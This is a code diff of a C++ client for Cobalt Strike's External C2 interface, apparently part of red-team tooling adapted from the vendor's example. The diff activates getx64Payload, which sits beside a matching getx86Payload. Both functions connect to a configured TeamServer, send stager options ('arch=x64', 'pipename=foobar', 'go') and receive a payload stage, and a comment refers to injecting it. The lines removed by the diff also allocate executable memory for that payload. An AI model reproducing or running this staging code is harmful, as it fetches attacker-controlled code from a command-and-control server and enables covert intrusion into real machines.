@@ -6,24 +6,24 @@
 #include "constants.hpp"
 #include <iostream>
 #include "helpers.hpp"
+
+
 //pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c#L84
-/* receive a frame from a socket */
 
-
-DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max) {
-	DWORD size = 0, total = 0, temp = 0;
-
-	/* read the 4-byte length */
-	recv(my_socket, (char*)&size, 4, 0);
-
-	/* read in the result */
-	while (total < size) {
-		temp = recv(my_socket, buffer + total, size - total, 0);
-		total += temp;
-	}
-
-	return size;
-}
+//DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max) {
+//	DWORD size = 0, total = 0, temp = 0;
+//
+//	/* read the 4-byte length */
+//	recv(my_socket, (char*)&size, 4, 0);
+//
+//	/* read in the result */
+//	while (total < size) {
+//		temp = recv(my_socket, buffer + total, size - total, 0);
+//		total += temp;
+//	}
+//
+//	return size;
+//}
 
 //converetd to vector 
 std::vector<uint8_t> recv_frame(SOCKET my_socket) {
@@ -66,34 +66,41 @@ void send_frame(SOCKET my_socket, char* buffer, int length) {
 }
 
 //I'm being lazy so we have 2 funcs, one for x86 and one for x64
-//std::vector<uint8_t> getx64Payload() {
-//	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
-//	struct sockaddr_in 	sock;
-//	sock.sin_family = AF_INET;
-//	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
-//	sock.sin_port = htons(TeamServer::port);
-//
-//	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
-//	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
-//		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
-//		exit(0);
-//	}
-//
-//	send_frame(socket_extc2, (char*)"arch=x64", 8);
-//	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
-//	send_frame(socket_extc2, (char*)"block=100", 9);
-//
-//	/*
-//	 * request + receive + inject the payload stage
-//	 */
-//
-//	 /* request our stage */
-//	send_frame(socket_extc2, (char*)"go", 2);
-//
-//	//get payload
-//	std::vector<uint8_t> payload = recv_frame(socket_extc2);
-//	return payload;
-//};
+std::vector<uint8_t> getx64Payload() {
+	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
+	struct sockaddr_in 	sock;
+	sock.sin_family = AF_INET;
+	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
+	sock.sin_port = htons(TeamServer::port);
+
+	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
+	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
+		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
+		exit(0);
+		//return;
+	}
+
+	send_frame(socket_extc2, (char*)"arch=x64", 8);
+	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
+	send_frame(socket_extc2, (char*)"block=100", 9);
+
+	/*
+	 * request + receive + inject the payload stage
+	 */
+
+	 /* request our stage */
+	send_frame(socket_extc2, (char*)"go", 2);
+
+	//get payload
+	std::vector<uint8_t> payload = recv_frame(socket_extc2);
+
+	//std::vector<uint8_t> tempPayload;
+	//std::cout << "[?] Payload: ";
+	//printHexVector(payload);
+	std::cout << "[?] Payload of size " << payload.size() << " recieved. " << std::endl;
+
+	return payload;
+};
 
 std::vector<uint8_t> getx86Payload() {
 	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
@@ -123,12 +130,8 @@ std::vector<uint8_t> getx86Payload() {
 	//get payload
 	std::vector<uint8_t> payload = recv_frame(socket_extc2);
 
-	//char* payload = (char *)VirtualAlloc(0, 1024*100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	//recv_frame(socket_extc2, payload, 1024 * 100);
-
-	
 	//std::vector<uint8_t> tempPayload;
-	//std::cout << "[?] Payload: ";
+	std::cout << "[?] Payload of size " << payload.size() << " recieved. " <<std::endl;
 	//printHexVector(payload);
 	return payload;
 };
